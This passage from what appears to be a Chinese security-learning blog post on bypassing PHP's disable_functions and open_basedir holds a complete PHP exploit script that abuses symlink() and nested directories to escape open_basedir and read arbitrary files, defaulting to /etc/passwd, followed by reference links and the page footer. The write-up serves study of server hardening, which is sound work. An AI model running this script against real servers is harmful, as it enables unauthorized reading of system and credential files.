class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">* by phithon</span><br><span class="line">* From https:&#x2F;&#x2F;www.leavesongs.com</span><br><span class="line">* detail: http:&#x2F;&#x2F;cxsecurity.com&#x2F;issue&#x2F;WLB-2009110068</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&#39;content-type: text&#x2F;plain&#39;);</span><br><span class="line">error_reporting(-1);</span><br><span class="line">ini_set(&#39;display_errors&#39;, TRUE);</span><br><span class="line">printf(&quot;open_basedir: %s\nphp_version: %s\n&quot;, ini_get(&#39;open_basedir&#39;), phpversion());</span><br><span class="line">printf(&quot;disable_functions: %s\n&quot;, ini_get(&#39;disable_functions&#39;));</span><br><span class="line">$file &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, isset($_REQUEST[&#39;file&#39;]) ? $_REQUEST[&#39;file&#39;] : &#39;&#x2F;etc&#x2F;passwd&#39;);</span><br><span class="line">$relat_file &#x3D; getRelativePath(__FILE__, $file);</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $file);</span><br><span class="line">$name &#x3D; mt_rand() % 999;</span><br><span class="line">$exp &#x3D; getRandStr();</span><br><span class="line">mkdir($name);</span><br><span class="line">chdir($name);</span><br><span class="line">for($i &#x3D; 1 ; $i &lt; count($paths) - 1 ; $i++)&#123;</span><br><span class="line">    mkdir($paths[$i]);</span><br><span class="line">    chdir($paths[$i]);</span><br><span class="line">&#125;</span><br><span class="line">mkdir($paths[$i]);</span><br><span class="line">for ($i -&#x3D; 1; $i &gt; 0; $i--) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$paths &#x3D; explode(&#39;&#x2F;&#39;, $relat_file);</span><br><span class="line">$j &#x3D; 0;</span><br><span class="line">for ($i &#x3D; 0; $paths[$i] &#x3D;&#x3D; &#39;..&#39;; $i++) &#123; </span><br><span class="line">    mkdir($name);</span><br><span class="line">    chdir($name);</span><br><span class="line">    $j++;</span><br><span class="line">&#125;</span><br><span class="line">for ($i &#x3D; 0; $i &lt;&#x3D; $j; $i++) &#123; </span><br><span class="line">    chdir(&#39;..&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$tmp &#x3D; array_fill(0, $j + 1, $name);</span><br><span class="line">symlink(implode(&#39;&#x2F;&#39;, $tmp), &#39;tmplink&#39;);</span><br><span class="line">$tmp &#x3D; array_fill(0, $j, &#39;..&#39;);</span><br><span class="line">symlink(&#39;tmplink&#x2F;&#39; . implode(&#39;&#x2F;&#39;, $tmp) . $file, $exp);</span><br><span class="line">unlink(&#39;tmplink&#39;);</span><br><span class="line">mkdir(&#39;tmplink&#39;);</span><br><span class="line">delfile($name);</span><br><span class="line">$exp &#x3D; dirname($_SERVER[&#39;SCRIPT_NAME&#39;]) . &quot;&#x2F;&#123;$exp&#125;&quot;;</span><br><span class="line">$exp &#x3D; &quot;http:&#x2F;&#x2F;&#123;$_SERVER[&#39;SERVER_NAME&#39;]&#125;&#123;$exp&#125;&quot;;</span><br><span class="line">echo &quot;\n-----------------content---------------\n\n&quot;;</span><br><span class="line">echo file_get_contents($exp);</span><br><span class="line">delfile(&#39;tmplink&#39;);</span><br><span class="line"></span><br><span class="line">function getRelativePath($from, $to) &#123;</span><br><span class="line">  &#x2F;&#x2F; some compatibility fixes for Windows paths</span><br><span class="line">  $from &#x3D; rtrim($from, &#39;\&#x2F;&#39;) . &#39;&#x2F;&#39;;</span><br><span class="line">  $from &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to   &#x3D; str_replace(&#39;\\&#39;, &#39;&#x2F;&#39;, $to);</span><br><span class="line"></span><br><span class="line">  $from   &#x3D; explode(&#39;&#x2F;&#39;, $from);</span><br><span class="line">  $to     &#x3D; explode(&#39;&#x2F;&#39;, $to);</span><br><span class="line">  $relPath  &#x3D; $to;</span><br><span class="line"></span><br><span class="line">  foreach($from as $depth &#x3D;&gt; $dir) &#123;</span><br><span class="line">    &#x2F;&#x2F; find first non-matching dir</span><br><span class="line">    if($dir &#x3D;&#x3D;&#x3D; $to[$depth]) &#123;</span><br><span class="line">      &#x2F;&#x2F; ignore this directory</span><br><span class="line">      array_shift($relPath);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      &#x2F;&#x2F; get number of remaining dirs to $from</span><br><span class="line">      $remaining &#x3D; count($from) - $depth;</span><br><span class="line">      if($remaining &gt; 1) &#123;</span><br><span class="line">        &#x2F;&#x2F; add traversals up to first matching dir</span><br><span class="line">        $padLength &#x3D; (count($relPath) + $remaining - 1) * -1;</span><br><span class="line">        $relPath &#x3D; array_pad($relPath, $padLength, &#39;..&#39;);</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        $relPath[0] &#x3D; &#39;.&#x2F;&#39; . $relPath[0];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return implode(&#39;&#x2F;&#39;, $relPath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function delfile($deldir)&#123;</span><br><span class="line">    if (@is_file($deldir)) &#123;</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @unlink($deldir);</span><br><span class="line">    &#125;else if(@is_dir($deldir))&#123;</span><br><span class="line">        if(($mydir &#x3D; @opendir($deldir)) &#x3D;&#x3D; NULL) return false;</span><br><span class="line">        while(false !&#x3D;&#x3D; ($file &#x3D; @readdir($mydir)))</span><br><span class="line">        &#123;</span><br><span class="line">            $name &#x3D; File_Str($deldir.&#39;&#x2F;&#39;.$file);</span><br><span class="line">            if(($file!&#x3D;&#39;.&#39;) &amp;&amp; ($file!&#x3D;&#39;..&#39;))&#123;delfile($name);&#125;</span><br><span class="line">        &#125; </span><br><span class="line">        @closedir($mydir);</span><br><span class="line">        @chmod($deldir,0777);</span><br><span class="line">        return @rmdir($deldir) ? true : false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function File_Str($string)</span><br><span class="line">&#123;</span><br><span class="line">    return str_replace(&#39;&#x2F;&#x2F;&#39;,&#39;&#x2F;&#39;,str_replace(&#39;\\&#39;,&#39;&#x2F;&#39;,$string));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getRandStr($length &#x3D; 6) &#123;</span><br><span class="line">    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">    $randStr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $randStr .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);</span><br><span class="line">    &#125;</span><br><span class="line">    return $randStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/11.png" alt></p>
+<p>更多bypass方法参考：<a href="https://www.mi1k7ea.com/2019/07/20/浅谈几种Bypass-open-basedir的方法/#网上的一个脚本" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/#%E7%BD%91%E4%B8%8A%E7%9A%84%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC</a></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/4688#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4688#toc-8</a></p>
+<p><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p><a href="https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/#一-dl-拓展库绕过" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/26/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0bypass-disable-func/#%E4%B8%80-dl-%E6%8B%93%E5%B1%95%E5%BA%93%E7%BB%95%E8%BF%87</a></p>
+<p><a href="https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/10/09/Bypass-disabled-functions-open-basedir-php/</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01前言"><span class="toc-number">1.</span> <span class="toc-text">0x 01前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02第二种：mod-cgi-bypass介绍"><span class="toc-number">2.</span> <span class="toc-text">0x 02第二种：mod_cgi bypass介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-第四种：-LD-PRELOAD-bypass介绍"><span class="toc-number">3.</span> <span class="toc-text">0x 03 第四种： LD_PRELOAD bypass介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">3.0.1.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#putenv可以设置环境变量"><span class="toc-number">3.0.2.</span> <span class="toc-text">putenv可以设置环境变量</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-其他bypass技巧介绍"><span class="toc-number">4.</span> <span class="toc-text">0x 04 其他bypass技巧介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#外部扩展库dl-bypass介绍"><span class="toc-number">4.1.</span> <span class="toc-text">外部扩展库dl bypass介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7-4-FFI-bypass介绍"><span class="toc-number">4.2.</span> <span class="toc-text">PHP7.4-FFI bypass介绍</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-05-两个常用的bypass链接"><span class="toc-number">5.</span> <span class="toc-text">0x 05 两个常用的bypass链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-06-Bypass-open-basedir"><span class="toc-number">6.</span> <span class="toc-text">0x 06 Bypass open_basedir</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#chdir-bypass"><span class="toc-number">6.1.</span> <span class="toc-text">chdir bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用symlink-函数来Bypass"><span class="toc-number">6.2.</span> <span class="toc-text">利用symlink()函数来Bypass</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/&title=Bypass disabled_functions &amp; open_basedir学习" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/&title=Bypass disabled_functions &amp; open_basedir学习" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/&text=Bypass disabled_functions &amp; open_basedir学习" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bypass disabled_functions &amp; open_basedir学习&body=Check out this article: http://yoursite.com/2020/03/21/Bypass-disabled-functions-open-basedir%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
